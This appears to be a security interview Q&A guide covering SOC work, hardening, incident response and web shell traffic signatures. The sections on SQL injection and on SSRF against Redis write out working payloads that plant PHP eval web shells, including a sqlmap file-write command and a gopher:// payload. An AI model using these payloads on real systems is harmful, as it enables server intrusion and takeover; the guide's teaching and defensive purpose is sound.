# Operational Depth

---

## Q: How do you handle false positives from security devices?

**A:** False positives from external sources typically indicate a need for device policy tuning and do not require immediate action. For internal false positives, you should:

1. Consult with the responsible team to determine the root cause.
2. Add exceptions or whitelist rules if the traffic is confirmed to be legitimate.
3. Document the decision for future reference.

---

## Q: How do you distinguish between scanning traffic and manual attack traffic?

**A:** 

- **Scanning traffic:** Large volume, regular patterns, high frequency, and often contains tool‑specific signatures (e.g., in User‑Agent, headers, or payloads). Tools like AWVS, Nessus, and AppScan leave identifiable fingerprints in request URLs, headers, or body.
- **Manual traffic:** Smaller volume, irregular intervals, and less predictable patterns.

You can use Wireshark filters (e.g., `http contains "xxx"`) to search for keywords and identify anomalous patterns.

---

## Q: What is the process if a website is found to have a web shell?

**A:** 

1. **Isolate the site:** Take the website offline and, if necessary, disconnect the server from the network.
2. **Combine manual and automated detection:**
   - Use tools like D‑Shield Web Shell Killer, ShellPub, or online scanners to scan web directories.
   - Compare against a known‑good backup to identify new or modified files.
3. **Remediate:** Remove malicious files and restore from clean backups if possible.
4. **Strengthen security:** Regularly back up configuration files, apply patches, update components, enforce strong passwords, and monitor for anomalies.

---

## Q: How would you analyse a large log file?

**A:** 

- **Signature matching:** Use regular expressions to detect known attack patterns.
- **Statistical analysis:** Identify requests that occur significantly less often than the average.
- **Whitelist approach:** Establish a baseline of normal requests and flag anything outside it.
- **Machine learning (HMM):** Automatically model normal behaviour and flag deviations.
- **Use log analysis tools:** LogForensics, Graylog, Nagios, or the ELK Stack (Elasticsearch, Logstash, Kibana).

---

## Q: What are some common enterprise collaboration platforms (OA systems) that are often targeted?

**A:** 

- **PHP‑based:** Tongda OA, WeOffice Eoffice.
- **Java‑based:** WeOffice OA/Cloud Bridge, Zhiyuan OA, Lanling OA, Yongyou OA.
- **ASP‑based:** Qilai OA.

These are commonly used in enterprise environments and are frequent targets for attackers.

---

## Q: Can you describe common security devices and their functions?

**A:** 

- **IPS (Intrusion Prevention System):** Monitors network traffic and actively blocks or modifies malicious activity.
- **IDS (Intrusion Detection System):** Passively monitors and alerts on suspicious activity.
- **Firewall:** Enforces access control policies between networks with different trust levels.
- **Database Audit System:** Captures and analyses database access traffic to detect and log unauthorised queries.
- **Log Audit System:** Collects, stores, and analyses logs from various sources for security monitoring and compliance.
- **Bastion Host (Jump Server):** Centralised access control and audit for administrative users.
- **Vulnerability Scanner:** Identifies security weaknesses in systems and applications.
- **Security Situational Awareness Platform:** Aggregates and correlates security data to provide a holistic view of the environment.
- **Endpoint Security Management:** Combines antivirus, access control, and EDR capabilities.
- **WAF (Web Application Firewall):** Inspects HTTP/HTTPS traffic to block web attacks.
- **Honeypot:** A decoy system designed to attract and detect attackers.

---

## Q: What are the key areas of system hardening?

**A:** 

**Account Security:**
- **Windows:** Disable guest accounts, enforce account lockout policies, and restrict remote logins.
- **Linux:** Lock unnecessary accounts (`passwd -l`), restrict `sudo` usage, and configure login failure limits (`faillog`).

**Password Security:**
- **Windows:** Enforce complexity (uppercase, lowercase, digits, specials), minimum length, and password history.
- **Linux:** Check for empty passwords in `/etc/shadow`, set password expiration via `/etc/login.defs`.

**Service & Port Management:**
- Close or restrict high‑risk ports (e.g., SSH 22, Telnet 23, RDP 3389).
- Use firewalls (e.g., `iptables`) to block or limit access.

**File Permissions:**
- Set appropriate permissions (`chmod`) and use `chattr` to make critical files immutable.

**Logging & Auditing:**
- Configure system logging (`/var/log/messages`, `/var/log/secure`, etc.) and forward logs to a central server.

**Network Controls:**
- Disable unnecessary protocols (e.g., ICMP echo), restrict USB devices, and prevent users from modifying IP settings.

---

## Q: What security tools have you used?

**A:** 

- **SIEM/SOC:** OSSIM (open source).
- **IPS:** Snort, Security Onion.
- **Firewalls:** TinyWall, ClearOS, or commercial endpoint protection.
- **WAF:** ModSecurity, Website Security Dog, or Baota.
- **Threat Intelligence:** MISP, OpenCTI.
- **Vulnerability Scanning:** OpenVAS, AWVS, Nessus.
- **Bastion Host:** JumpServer (can manage Windows hosts).
- **Honeypot:** T‑Pot, HFish.

---

## Q: What is Cobalt Strike and how is it used?

**A:** Cobalt Strike is a commercial penetration testing tool used for adversary simulation and post‑exploitation. It operates in a client‑server model, allowing multiple operators to collaborate.

**Common use cases:**
- Creating listeners to receive reverse shells.
- Generating payloads (e.g., Windows executables, Office macros, HTML applications).
- Conducting phishing campaigns and lateral movement.

**Basic workflow:**
1. Start the server and connect with the client.
2. Set up a listener (IP/port).
3. Generate a payload and deliver it to the target.
4. When executed, the target connects back, establishing a session.

---

## Q: What is a WAF and how does it work?

**A:** A Web Application Firewall protects web applications by filtering and monitoring HTTP/HTTPS traffic. It can be deployed in various forms:

- **Non‑embedded:** Hardware appliances, cloud‑based, or virtual appliances.
- **Embedded:** Modules within web servers (e.g., Apache mod_security) or code‑level filters.

**How it works:** WAFs apply rule sets to inspect requests for malicious patterns (SQL injection, XSS, etc.) and take actions such as blocking, logging, or alerting.

---

## Q: Are you familiar with PowerShell?

**A:** PowerShell is a task automation and configuration management framework from Microsoft. It is widely used for system administration and security tasks.

**Common commands:** `pwd`, `ls`, `cd`, `mkdir`, `rm`, `Get-Process`, `Get-Date`, `Get-Host`.

In a security context, frameworks like PowerSploit leverage PowerShell for post‑exploitation, including information gathering, privilege escalation, and persistence.

---

## Q: What is Metasploit Framework (MSF) and how is it used?

**A:** Metasploit is an open‑source penetration testing framework that provides tools for reconnaissance, vulnerability detection, exploitation, and post‑exploitation.

**Key modules:**
- **Auxiliary:** Scanning, sniffing, and fingerprinting.
- **Exploits:** Code that leverages vulnerabilities to gain access.
- **Payloads:** Code to execute on the target (e.g., reverse shells).
- **Post:** Actions after successful exploitation (e.g., privilege escalation, data exfiltration).
- **Encoders:** Obfuscate payloads to evade detection.

**Typical workflow:**
1. Use auxiliary modules to discover vulnerabilities.
2. Select an exploit and set the appropriate payload.
3. Configure local listener settings.
4. Execute the exploit; if successful, a session is created for further actions.

---

## Q: What XSS platforms have you used?

**A:** 

- **BlueLotus XSS** (from the Blue-Lotus team).
- **xss‑platform** (open source).
- **BeEF** (Browser Exploitation Framework) – included in Kali Linux.
- **Postman** (for manual testing and payload crafting).

---

## Q: How can you write a web shell via SQL injection?

**A:** Writing a web shell requires:

- Knowledge of the web root path.
- File write permissions (usually requires `FILE` privilege in MySQL).
- The `secure_file_priv` setting not being restrictive.

**Common methods:**

- **Union + into outfile:**
  ```sql
  ' UNION SELECT 1,"<?php @eval($_POST['shell']);?>",3 INTO OUTFILE 'C:/path/to/shell.php'#
  ```
- **Into dumpfile:**
  ```sql
  ' UNION SELECT 1,"<?php @eval($_POST['shell']);?>",3 INTO DUMPFILE 'C:/path/to/shell.php'#
  ```
- **Using `lines terminated by`:**
  ```sql
  ' INTO OUTFILE 'C:/path/to/shell.php' LINES TERMINATED BY '<?php phpinfo();?>'
  ```
- **Using `sqlmap`:**  
  `sqlmap -u "target" --file-write=shell.php --file-dest=/tmp/shell.php`

---

## Q: What is deserialisation and why is it a security risk?

**A:** Deserialisation is the process of converting a byte stream back into an object. Insecure deserialisation occurs when user‑controlled data is deserialised without proper validation, allowing attackers to manipulate the object state or trigger malicious code execution.

**PHP:** Vulnerable functions like `unserialize()` can be exploited via magic methods (`__construct`, `__destruct`, `__wakeup`, etc.).

**Java:** The `readObject()` method is a common entry point. Attackers can craft payloads that execute arbitrary commands during deserialisation.

---

## Q: What are some common framework vulnerabilities?

**A:** 

**Log4j (CVE-2021-44228):**
- An open‑source Java logging library. The JNDI lookup feature allows remote code execution when the `${jndi:ldap://...}` pattern is logged.
- **Impact:** Remote code execution; patched in later versions.

**Fastjson Deserialisation:**
- Fastjson is a JSON parser for Java. The `autotype` feature allows attackers to specify arbitrary classes, leading to deserialisation vulnerabilities.
- **Detection:** Look for `fastjson` in error responses or use crafted POST requests to identify the library.
- **Exploitation:** Craft a `@type` payload that references a malicious class.

**Shiro Deserialisation (CVE-2016-4437, CVE-2020-1957):**
- Shiro's "Remember Me" feature uses AES encryption with a hard‑coded key (in older versions). Attackers can forge a valid `rememberMe` cookie containing a malicious serialised object.
- **Detection:** Response contains `rememberMe=deleteMe`.
- **Exploitation:** Use known keys or padding oracle attacks (CVE-2020-1957).

---

## Q: What is Redis and what vulnerabilities are associated with it?

**A:** Redis is an in‑memory data store used as a database, cache, or message broker. It runs on port 6379 by default.

**Common issues:**

- **Unauthorised access:** When no password is set, attackers can connect and perform arbitrary operations.
- **Potential impacts:**
  - **SSH key injection:** Write an SSH public key to `~/.ssh/authorized_keys` (if Redis runs as root).
  - **Web shell:** Write a PHP script to the web root.
  - **Reverse shell:** Use `cron` or `gopher`/`dict` protocols to schedule tasks.
  - **Master‑slave exploitation:** For versions 4.x–5.0.5, attackers can use a rogue Redis server to execute arbitrary code.

**Mitigation:**
- Set a strong password (`requirepass`).
- Bind to localhost or restrict network access.
- Run Redis as a low‑privilege user.
- Disable dangerous commands (e.g., `CONFIG`, `SAVE`).

---

## Q: How can SSRF be used to exploit Redis?

**A:** SSRF (Server‑Side Request Forgery) allows an attacker to make requests from the vulnerable server. Two common protocols are used:

- **dict protocol:** Send commands directly to Redis.
  - Example: `ssrf.php?url=dict://target:6379/config:set:dir:/var/www/html`
  - Can also be used to test credentials, write files, or schedule tasks.

- **gopher protocol:** Encapsulate Redis commands in a single request.
  - The payload must be URL‑encoded twice to bypass filters.
  - Example payload for writing a web shell:
    ```
    gopher://127.0.0.1:6379/_SET%20x%20%22%3C?php%20phpinfo();?%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE
    ```

**Prevention:** Validate and restrict the URLs that can be requested; block access to internal IP ranges.

---

## Q: What are the key steps in a Windows incident response investigation?

**A:** 

**Account and Session Analysis:**
- Check for weak passwords and open RDP/SSH ports.
- Use `lusrmgr.msc` to look for suspicious, hidden, or newly created accounts.
- Analyse security logs (`eventvwr.msc`) for event IDs like:
  - **4624:** Successful logon.
  - **4625:** Failed logon.
  - **4672:** Administrative logon.
  - **4720:** User creation.
- Use `query user` to see active remote sessions.

**Process and Service Analysis:**
- Monitor CPU, memory, and network usage for anomalies.
- Look for processes with random names (e.g., `hrlC3.tmp`, `hrlD5.tmp`) – these are often malicious.
- Verify digital signatures and descriptions of running processes.
- Use tools like Process Hacker or FireEye’s Red Team Tool (e.g., `procmon`).

**Startup Items:**
- Check `msconfig` or Task Manager startup tab for unknown entries.
- Review scheduled tasks and services.

**File System Analysis:**
- Inspect `Temp`/`Tmp` directories for suspicious files.
- Look at `Recent` files (quick access) for recently opened documents.
- Compare file timestamps (creation, modification, access) for anomalies (e.g., modification time before creation).

**Malware Detection:**
- Use antivirus and dedicated web shell scanners (D‑Shield, ShellPub) to scan directories.
- If a specific file is identified, analyse its behaviour and associated processes.

---

## Q: What are the traffic characteristics of common web shell tools?

**A:** 

**China Chopper:**
- Uses Base64‑encoded payloads; parameters like `z0` and `z1` are common.
- Contains the string `QG` at the start and `7J` at the end.

**AntSword:**
- User‑Agent contains `antsword` (default, can be changed).
- Splits payloads into multiple Base64‑encoded parts.
- Often includes `@ini_set("display","0")`.

**Behinder (v2.0 / v3.0):**
- **v2.0:** Uses AES encryption; three requests for key exchange and communication.
- **v3.0:** Uses AES with a key derived from the password’s MD5 hash; two requests.

**Godzilla:**
- PHP/ASP variants often use simple one‑liners with Base64 encoding.
- Java variants include classes like `getClass()` and `getClassLoader()`.
- Response headers often include `Cache-Control: no-store, no-cache`.

**General indicators:**
- Unusual POST requests to static files (e.g., images, CSS).
- Repeated requests to the same URL with varying parameters.
- Long request bodies with encrypted or encoded content.


---

